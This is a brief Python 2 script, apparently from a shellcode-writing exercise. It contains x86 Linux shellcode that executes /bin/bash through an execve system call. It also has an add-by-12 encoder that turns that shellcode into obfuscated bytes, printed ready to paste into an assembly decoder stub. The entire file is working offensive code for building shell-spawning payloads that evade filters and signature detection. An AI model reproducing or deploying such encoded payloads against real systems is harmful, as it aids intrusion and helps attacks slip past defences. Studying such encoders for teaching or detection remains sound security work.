#!/usr/bin/env python

shellcode = ("\x68\x43\x43\x44\x44\x68\x42\x42\x43\x43\x68\x68\x41\x42\x42\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x31\xdb\x88\x5c\x24\x09\x89\x64\x24\x0a\x89\x5c\x24\x0e\x8d\x1c\x24\x8d\x4c\x24\x0a\x8d\x54\x24\x0e\x31\xc0\xb0\x0b\xcd\x80")

encodeWithByte = 12 

maxValue = 256 - encodeWithByte

encodedShellcode = ""

db_shellcode = []

for byte in bytearray(shellcode):
    if byte < maxValue:
        encodedShellcode += '\\x%02x' % (byte + encodeWithByte)
        db_shellcode.append('0x%02x' % (byte + encodeWithByte))
    else:
        encodedShellcode += '\\x%02x' % (encodeWithByte - 256 + byte)
        db_shellcode.append('0x%02x' % (encodeWithByte - 256 + byte))

print "Encoded shellcode:\n%s\n" % encodedShellcode

print "DB formatted shellcode (to paste in .nasm file):\n%s\n" % ','.join(db_shellcode)
